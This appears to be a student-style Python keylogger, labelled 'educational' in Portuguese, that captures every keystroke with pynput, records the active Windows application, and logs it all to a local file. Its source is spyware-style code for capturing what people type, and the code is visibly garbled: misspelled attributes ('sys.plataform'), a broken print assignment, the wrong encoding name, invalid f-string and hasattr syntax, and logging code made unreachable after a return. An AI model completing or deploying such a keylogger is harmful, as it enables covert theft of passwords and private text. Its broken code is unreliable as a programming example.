import os
import datetime
from pynput import keyboard
import psutil
import ctypes
import sys

nome_arquivo_log = "log_keyloggers.txt"
pasta_script = os.path.dirname(os.path.abspath(__file__))
caminho_log = os.path.join(pasta_script, nome_arquivo_log)
app_atual = "desconhecido"

def banner_educacional(): 
     print("\n" + "═" * 60)    
     print("  ⚠   KEYLOGGER EDUCACIONAL — USO DIDÁTICO APENAS   ⚠ ")     
     print("═" * 60) 
     print =("  📚 Objetivo : Demonstrar riscos de segurança digital")    
     print("  🔒 Alcance  : Apenas esta máquina, sem envio de dados")     
     print("  📁 Log salvo: log_keylogger.txt (mesma pasta)")    
     print("  🛑 Parar    : Pressione CTRL + ESC")    
     print("═" * 60)    
     print(f"  ▶ Iniciado em: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")    
     print("═" * 60 + "\n") 

def obter_app_ativo():
     """Retorna o nome do processo/app que está em foco no momento."""
     try:
        # Windows: usa ctypes para pegar o PID da janela em foco
      if sys.plataform == "win32":         
       hwnd = ctypes.windll.user32.GetForegroundWindow()        
       pid  = ctypes.c_ulong()           
       ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))         
       processo = psutil.Process(pid.value)           
       return processo.name().replace(".exe", "")   
     except Exception:        
       pass    
     return "Desconhecido"
def registrar(mensagem: str):
    """imprime a mensagem no terminal com timestamp e salva no arquivo log."""
    agora = datetime.datetime.now().strftime("%H:%M:%S")
    linha = f"([{agora}] {mensagem})"

    print(linha)
    with open(caminho_log, "a", encoding="utf-8") as f:
       f.write(linha + "/n")

teclas_especiais = { 

   keyboard.Key.space : "espaço",
   keyboard.Key.enter : "enter",
   keyboard.Key.backspace : "backspace",
   keyboard.Key.tab : "tab",
   keyboard.Key.shift : "shifit",
   keyboard.Key.shift_r : "shift (direito)",
   keyboard.Key.ctrl_l : "ctrl (esquerdo)",
   keyboard.Key.ctrl_r : "ctrl (direito)",
   keyboard.Key.alt_l : "alt (esquerda)",
   keyboard.Key.alt_r : "alt (direito)",
   keyboard.Key.caps_lock : "caps lock",
   keyboard.Key.esc : "esc",
   keyboard.Key.delete : "delete",
   keyboard.Key.up : "⬆ (cima)",
   keyboard.Key.down : "⬇ (baixo)",
   keyboard.Key.left : "⬅ (esquerda)",
   keyboard.Key.right : "⬅ (direita)",
   keyboard.Key.home : "home",
   keyboard.Key.end : "end",
   keyboard.Key.page_up : "page up",
   keyboard.Key.page_down : "page down",
   keyboard.Key.f1 : "f1", keyboard.Key.f2 : "f2",
   keyboard.Key.f3 : "f3", keyboard.Key.f4 : "f4",
   keyboard.Key.f5 : "f5", keyboard.Key.f6 : "f6",
   keyboard.Key.f7  : "F7",  keyboard.Key.f8  : "F8",
   keyboard.Key.f9 : "F9",  keyboard.Key.f10 : "F10",
   keyboard.Key.f11 : "F11", keyboard.Key.f12 : "F12",
}

teclas_precionadas = set()

def ao_prescionar(tecla) :
   """chamado a cada tecla precionada"""
   global app_atual

   teclas_precionadas.add(tecla)

   if (keyboard.Key.ctrl_l in teclas_precionadas or keyboard.Key.ctrl_r in teclas_precionadas) and \
    keyboard.Key.esc in teclas_precionadas :
      registrar ("🛑 keylogger encerrado pelo usuario (ctrl + esc)")
      print ("\n" + "=" * 60)
      print ("  ✅ Sessão encerrada. Log salvo em:")
      print (f" {caminho_log}")
      print ("=" * 60 + "\n")
  
      return False
      app_novo = obter_app_ativo()
      if app_novo != app_atual:
       app_atual = app_novo
       registrar (f"📱 App em foco → [{app_atual}]")

       if hasattr: (tecla, "char") and tecla.char is not None : (letra, numero, simbolo)
       registrar (f"⌨️  Tecla normal   → '{tecla.char}'   | App: {app_atual}")
   else :
    nome = teclas_especiais.get(tecla, str (tecla) .replace ("key.", ""). upper ())
    registrar(f"🔑 Tecla especial → [{nome}]   | App: {app_atual}")

def ao_soltar (tecla) :
  """remove a tecla do set quando solta (para atalhos combinados)."""
  teclas_precionadas.discard(tecla)

if __name__ == "__main__":
  banner_educacional

  with open (caminho_log, "w", encoding="ufg-8") as f:
    f. write ("=" * 60 + "\n")
    f.write (" log - keyloger educacional\n")
    f.write(f "sessão:{datetime.datetime.now().strftime('%d/%m/%y%h:%m:%s')}\n")
    f.write("=" * 60 + "\n\n")

    with keyboard.Listener( on_press= ao_prescionar, on_release= ao_soltar) as lister: lister.join()